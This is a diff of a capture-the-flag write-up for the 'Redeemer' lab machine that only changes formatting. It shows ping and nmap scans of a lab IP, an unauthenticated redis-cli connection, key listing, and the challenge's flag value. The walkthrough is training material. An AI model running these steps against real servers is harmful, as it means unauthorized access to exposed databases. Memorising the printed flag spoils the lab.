@@ -1,7 +1,7 @@
-# Starting Point — Tier 0: Redeemer
+# Redeemer
 
-* Use **ping** to check if the host is up.
-```shell
+* Use ***ping*** to check if the host is up.
+```bash
 $ ping 10.129.57.87 -c 1
 PING 10.129.57.87 (10.129.57.87) 56(84) bytes of data.
 64 bytes from 10.129.57.87: icmp_seq=1 ttl=63 time=9.36 ms
@@ -11,8 +11,8 @@ PING 10.129.57.87 (10.129.57.87) 56(84) bytes of data.
 rtt min/avg/max/mdev = 9.355/9.355/9.355/0.000 ms
 ```
 
-* Run an **nmap** scan on the top 1000 ports.
-```shell
+* Run an ***nmap*** scan on the top 1000 ports.
+```bash
 $ sudo nmap -A 10.129.57.87
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-30 00:15 EST
 Nmap scan report for 10.129.57.87
@@ -31,8 +31,8 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 2.98 seconds
 ```
 
-* Run a concurrent **nmap** scan on all ports.
-```shell
+* Run a concurrent ***nmap*** scan on all ports.
+```bash
 $ sudo nmap -A 10.129.57.87 -p- -T4
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-30 01:34 EST
 Stats: 0:00:48 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
@@ -68,18 +68,18 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 61.48 seconds
 ```
 
-* Install the **redis-tools** package.
-```shell
+* Install the ***redis-tools*** package.
+```bash
 $ sudo apt-get install redis-tools
 ```
 
-* Connect to the **Redis** server without credentials.
-```shell
+* Connect to the ***Redis*** server without credentials.
+```bash
 $ redis-cli -h 10.129.57.87
 ```
 
-* List all keys on the **Redis** server.
-```shell
+* List all keys on the ***Redis*** server.
+```bash
 10.129.57.87:6379> KEYS *
 1) "numb"
 2) "temp"
@@ -88,7 +88,7 @@ $ redis-cli -h 10.129.57.87
 ```
 
 * Get the value of the flag key.
-```shell
+```bash
 10.129.57.87:6379> GET flag
 "03e1d2b376c37ab3f5319922053953eb"
 ```
